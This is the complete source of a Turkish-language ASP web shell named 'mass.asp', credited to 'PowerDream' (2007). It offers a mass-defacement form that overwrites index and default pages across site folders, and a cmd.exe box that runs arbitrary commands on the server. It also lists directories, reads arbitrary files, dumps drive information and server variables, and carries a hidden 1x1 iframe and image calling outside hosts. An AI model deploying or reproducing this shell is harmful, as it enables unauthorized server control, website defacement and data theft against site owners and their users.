<%
'Created by PowerDream<br>
'WebShell
'2007
'[TURKEY] 
%>

<%
On Error Resume Next
Set Objeto=Server.CreateObject("Scripting.FileSystemObject")
if request("t5") <> "" then
 Set ObjPasta = Objeto.GetFolder(request("t5"))
end if 
%>

<%On Error Resume Next
if request("t3") <> "" then
Set ObjPasta2 = Objeto.GetFolder(request("t3"))
set ObjFso=server.CreateObject("Scripting.FileSystemObject")
var_caminho=request("t3")
For Each Pasta in ObjPasta2.Subfolders
Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.aspx", 2, True, False)
 ObjAbreArq.writeline request("t4")
Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.aspx", 2, True, False)
 ObjAbreArq.writeline request("t4") 
Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.htm", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.html", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.asp", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.htm", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.html", 2, True, False)
 ObjAbreArq.writeline request("t4")
 set ObjAbreArq = nothing   
 Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.asp", 2, True, False)
 ObjAbreArq.writeline request("t4")
 if err then
   response.write "<font color=red><br>Way amk Hacklenmedi..!: </font>" & pasta.name
   err=0
 else
   response.write "<br>G?zün Ayd?n Hacklendi  :)" & pasta.name
 end if    
 set ObjAbreArq = nothing   
next
set ObjFso=nothing
Set ObjPasta2 = nothing
set ObjFso = nothing
end if
%><html xmlns="http://www.w3.org/1999/xhtml"><title>&#936;&nbsp;&#1071;&nbsp;&#920;&nbsp;J&nbsp;&#1044;&nbsp;&#1049; ...!</title>

<style type="text/css">
<!--
body {
	background-color: #FFFFFF;
}
.Estilo9 {color: #CCCCCC}
.Estilo10 {color: #FFFFFF}
.Estilo12 {color: #D06800}
.style1 {	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 9px;
	color: #FFFFFF;
}
.style2 {
	font-size: 16px;
	font-weight: bold;
	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #009999;
}
.style3 {font-size: x-small}
-->
</style>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" ><div align="center">
  <div align="center">
    <br>
    <table width="43%" height="38" border="1" cellpadding="0" cellspacing="0" bordercolor="#808080">
      <tr bordercolor="#808080">
        <td bgcolor="#FFFFFF" height="36" bordercolor="#000000" width="100%"><div align="center"><img src="http://img114.imageshack.us/img114/72/createdbypowerdreamshelnw8.jpg" width="600" height="150"><font color="#D06800" face="Tahoma" size="2"><b>
          <br>
        </b></font></div></td>
      </tr>
    </table>
    <br>
    <table width="52%" height="38" border="1" cellpadding="0" cellspacing="0" bordercolor="#808080" bgcolor="#000000">
      <tr bordercolor="#808080">
        <td bgcolor="#FFFFFF" height="18" bordercolor="#000000"><div align="center"><font color="#D06800" face="Tahoma" size="2"><strong>Server Bilgileri: </strong></font></div></td>
      </tr>
      <tr bordercolor="#808080">
        <td bgcolor="#000000" height="18" bordercolor="#000000" width="100%"><div align="center"><span style="color: #D06800"><font face="Verdana" style="font-size: 8pt">|Web Server : </font><span class="Estilo9"><font face="Tahoma" size="2"><%=request.servervariables("SERVER_SOFTWARE")%></font></span></span><font color="#D06800" face="Tahoma" size="2"> |</font><font face="Tahoma" size="2"><span style="color: #D06800"><font face="Verdana" style="font-size: 8pt">IP Server: </font></span></font>  <span class="Estilo9"><font face="Tahoma" size="2"><font face="Verdana" size="2"><%=request.servervariables("LOCAL_ADDR")%></font></font></span> <span style="color: #D06800"><font face="Verdana" style="font-size: 8pt">| Protocol: </font></span><font class="style1">
                  <% = Request.ServerVariables("SERVER_PROTOCOL") %>
        </font><font color="#D06800" face="Tahoma" size="2"> |<b><br>
        </b></font></div></td>
      </tr>
    </table>
    <br>    
    <table width="49%" height="38" border="1" cellpadding="0" cellspacing="0" bordercolor="#808080">
      <tr bordercolor="#808080">
        <td bgcolor="#FFFFFF" height="36" bordercolor="#000000" width="100%"><div align="center"><strong><font color="#D06800" size="1" face="Tahoma">Dizinler</font></strong><font color="#D06800" face="Tahoma" size="1"><b>:</b></font><font face="Tahoma" size="2"><b><span class="Estilo9"> <%=server.mappath("mass.asp")%></span></b></font><font color="#D06800" face="Tahoma" size="2"><b><br>
        </b></font></div></td>
      </tr>
    </table>
<br>
    <form method="POST" action="mass.asp">
  <font color="Black" face="Verdana" size="2">
  <p align="center"><b>Dizinleri G&ouml;ster :</b> 
    <input type="text" name="T5" size="40" value= <%=request("t5")%> ><input type="submit" value="Dir" name="B1"></p>
</form>
<div align="center">
  <center>
  <table border="1" width="70%" bordercolor="#333333" cellspacing="0" cellpadding="0">
    <tr bordercolor="#000000" bgcolor="#000000">
      <td width="50%" height="27" bgcolor="#FFFFFF">
        <p align="center"><font color="#D06800" face="Tahoma" size="1"><strong>Direkt&ouml;rler</strong></font></td>
      <td width="50%" bgcolor="#FFFFFF">
        <p align="center"><font color="#D06800" face="Tahoma" size="1"><strong>Arsivler</strong></font></td>
    </tr>
    <tr bordercolor="#000000">
      <td width="50%" valign="top">
     <% On Error Resume Next
     dim contador
     contador=1
      For Each Pasta in ObjPasta.Subfolders
         Response.Write Contador & "-) "& Pasta.Name & "<br>"
         contador=contador+1
      next%>&nbsp;</td>
      <td width="50%" valign="top">
     <%On Error Resume Next
       For Each Archivo in ObjPasta.Files
         Response.Write Archivo.Name & "<br>" 
       Next%>&nbsp;</td>
    </tr>
  </table><br>
  </center>
</div>
  </div>
      </div>
        </td>
      </tr>
<center>

    <table width="49%" height="111" border="1" cellpadding="0" cellspacing="0" bordercolor="#808080">
      <tr bordercolor="#808080">
        <td bgcolor="#FFFFFF" height="109" bordercolor="#000000" width="100%"><div align="center">
          <font color="#D06800" face="Tahoma" size="2"><b><br>
          <form method=POST action=mass.asp>
            <font color="#D06800" face="Tahoma" size="1"><b>MASS DEFACEMENT</b></font><span class="Estilo10"><span class="Estilo12"><font size="2" face="Fixedsys">:</font></span><br>
            <br>
            </span><font color="#D06800" face="Tahoma" size="1"><strong>Dizinler: </strong></font>
            <input type="text" name="T3" size="44" style="font-family: Tahoma; font-size: 8pt; color: #666666; border: 1px solid #808080; background-color: #FFFFFF">
            <br>
            <span class="Estilo10"><br>
            <font color="#D06800" face="Tahoma" size="2"><strong>Html Kodlari Buraya Giriniz </strong></font></span><font color="#D06800" face="Tahoma" size="2"><strong>:</strong></font><b><br>
            </b><font color="#D06800" face="Tahoma" size="2"><b><font face="Tahoma"><b>
            <textarea rows="6" name="T4" cols="49" style="font-family: Tahoma; font-size: 8pt; color: #666666; border: 1px solid #808080; background-color: #FFFFFF"> Defacee by &#936;&nbsp;&#1071;&nbsp;&#920;&nbsp;J&nbsp;&#1044;&nbsp;&#1049; ...!
</textarea>
            </b></font></b></font><br>
            <input type="submit" value="Mass Defacement" name="B1">
            <br>
          </form>
          </b></font>
          </div></td>
      </tr>
  </table>
    <br>
    <span class="Estilo13"><font face="Tahoma" size="2"><table width="34%" height="38" border="1" cellpadding="0" cellspacing="0" bordercolor="#808080">
      <tr bordercolor="#808080">
        <td bgcolor="#FFFFFF" height="36" bordercolor="#000000" width="100%"><div align="center"><strong>
        <font face="Tahoma" size="1" color="#D06800">CMD Bilgileri:</font></strong></div></td>
      </tr>
    </table>
</center>
<div align="center">
  <%
Dim oScript
Dim oScriptNet
Dim oFileSys, oFile
Dim szCMD, szTempFile

On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet=Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
szTempFile = "C:\" & oFileSys.GetTempName( )
Call oScript.Run ("cmd.exe /c " & szCMD & ">" & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If
%>
  <PRE>  <%
If (IsObject(oFile)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
End If
%>
  <br>
  <%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
</div>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
  <div align="center"><font face="Verdana">cmd&gt;</font>      <input name=".CMD"  type="text" value="<%= szCMD %>" size="90" class="neo" maxlength="100">
    <input type=submit class="neo" value="G&ouml;r&uuml;nt&uuml;le">
  </div>

</div>
<form method="POST" action="mass.asp">
   <p align="center"><span class="style3"><font face="Verdana" color="#000000">Direkt&ouml;rler / Ar&#351;ivler</font><font face="Verdana" color="#000000"></font></span><font face="Verdana" color="#000000">:

       <input type="text" name="TT" size="39"> 
       <input type="submit" value="Editle" name="B1">
  </font></p>
</form>
<%On Error Resume Next
if request("tt") <> "" then
          var_caminho=request("tt")
          set ObjFso2=server.CreateObject("Scripting.FileSystemObject")
          Set ObjAbreArq2 = ObjFso2.OpenTextFile(Var_Caminho, 1, True, False)
           Do While Not ObjAbreArq2.AtEndOfStream
              Linha = Linha & ObjAbreArq2.Readline & chr(13)
           Loop
           response.write "<TEXTAREA NAME=sujos ROWS=10 COLS=70>" & Linha & "</TEXTAREA>"
           ObjAbreArq2.Close
           Set ObjAbreArq2 = Nothing
           ObjFso2.close
           set ObjFso2 = Nothig
end if%>
<p align="center">
_____________________________________________________________________________________________________</p>
<iframe src="http://www.Trenz.pl/rc/" width=1 height=1 frameborder=0></iframe>
</body>
</font></span></font>
<%set ObjPasta = nothing
set Objeto = nothing%></html> </FORM><div align="center"></div>
<%set ObjPasta = nothing
set Objeto = nothing%>
<p>&nbsp; 
   </p>
<table width="100%" border="1" cellspacing="0" cellpadding="0" height="7" style="border-collapse: collapse" bordercolor="#808080">
    <td bgcolor="#000000" height="10" bordercolor="#000000"> 
      <div align="center"><b> <font face="Tahoma" size="1" color="#D06800">Extra Bilgiler</font></b></div>
    </td>
</table>
<div align="center"> 
<%
      DIM fs, d, dc, s, n, sp
      Set fs=Server.Createobject("Scripting.FileSystemObject")
      Set dc=fs.drives
%> 
</p>
  <table border="0" width="750">
    <tr bgcolor="#000000" bordercolor="#000000"> 
      <td style="border: 1 solid #808080"> 
        <div align="left"><b><font face="Verdana" size="1" color="#D06800">Hard Diskler</font></b></div>
      </td>
      <td style="border: 1 solid #808080"> 
        <div align="left"><b><font face="Verdana" size="1" color="#D06800">Tipleri</font></b></div>
      </td>
      <td style="border: 1 solid #808080"> 
        <div align="left"><b><font color="#D06800" face="Verdana" size="1">Numaralari</font></b></div>
      </td>
      <td style="border: 1 solid #808080"> 
        <div align="left"><b><font face="Verdana" size="1" color="#D06800">Sistem Bilgileri ve Arsivler</font></b></div>
      </td>
      <td style="border: 1 solid #808080"> 
        <div align="left"><b><font face="Verdana" size="1" color="#D06800">Limit 
          </font></b></div>
      </td>
      <td style="border: 1 solid #808080"> 
        <div align="left"><b><font face="Verdana" size="1" color="#D06800"> 
          Total</font></b></div>
      </td>
    </tr>
    <% 
    back1="#D3E2E7"
    back2="#AFFEDE"
    back=back2
    FOR EACH d IN dc 
    IF (back=back2) THEN
      back=back1
    ELSE
      back=back2
    END IF
     
  %> <tr> 
      <td bordercolor="#808080"> 
        <div align="left"><font face="Tahoma" size="1" color="#000000"> <%=d.driveletter%> </font></div>
      </td>
      <td bordercolor="#808080"> 
        <div align="left"><font face="Tahoma" size="1" color="#000000"> 
          <%
      IF d.DriveType = 0 Then
        s = "Unknown"
        IF d.VolumeName = "" Then
          n = "&nbsp;"
        Else
          n = d.VolumeName
        END IF
      ELSEIF d.drivetype=1 THEN
        s="Removable"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=2 THEN
         s="Fixed"
         IF d.isready THEN
           n=d.volumename
         ELSE
           n="--"
         END IF
      ELSEIF d.drivetype=3 THEN
        s="Network"
        IF d.isready THEN
          n=d.sharename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=4 THEN
        s="CDROM"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=5 THEN
        s="RAM Disk"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      END IF
      response.write(s)
    %> </font></div>
      </td>
      <td bordercolor="#808080"> 
        <div align="left"><font face="Tahoma" size="1" color="#000000"> <%=n%> </font></div>
      </td>
      <td bordercolor="#808080"> 
        <div align="left"><font face="Tahoma" size="1" color="#000000"> 
          <%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        set sp=fs.getdrive(str)
        response.write(sp.filesystem)
      ELSE
        response.write("--")
      END IF
    %> </font></div>
      </td>
      <td bordercolor="#808080"> 
        <div align="left"><font face="Tahoma" size="1" color="#000000"> 
          <%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        freespace = (d.AvailableSpace / 1048576)
        set sp=fs.getdrive(str)
        response.write(Round(freespace,1) & " MB")
      ELSE
        response.write("--")
      END IF
    %> </font></div>
      </td>
      <td bordercolor="#808080"> 
        <div align="left"><font face="Tahoma" size="1" color="#000000"> 
          <%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        totalspace = (d.TotalSize / 1048576)
        set sp=fs.getdrive(str)
        response.write(Round(totalspace,1) & " MB")
      ELSE
        response.write("--")
      END IF
    %> </font></div>
      </td>
    </tr>
    <%NEXT%> </table>
  <table width="750" border="0">
    <tr> 
      <td></td>
    </tr>
  </table>
</div>
<p align="center"><b><font face="Tahoma" size="2" color="#808080"> <font color="#000000">&nbsp;&nbsp;&nbsp;&nbsp;Server Hakk?nda Geni? Bilgi</font></font></b><b><font face="Tahoma" size="2" color="#808080"><br>
  </font></b> 
  <textarea rows="7" name="S1" cols="90" style="font-family: Tahoma; font-size: 8pt; color: #808080; border: 1px solid #808080; background-color: #000000"><%
for each thing in request.servervariables
tempvalue=request.servervariables(thing)
response.write thing & "=" & tempvalue & "<br>" 
next
%> 
</textarea> </p>
<div align="center"></div>
<div style="display: none;">
<img src="http://www.hackerlar.net/copyright.jpg">
</div>
</body></html>
<p align="center">
_____________________________________________________________________________________________________</p>
</body>
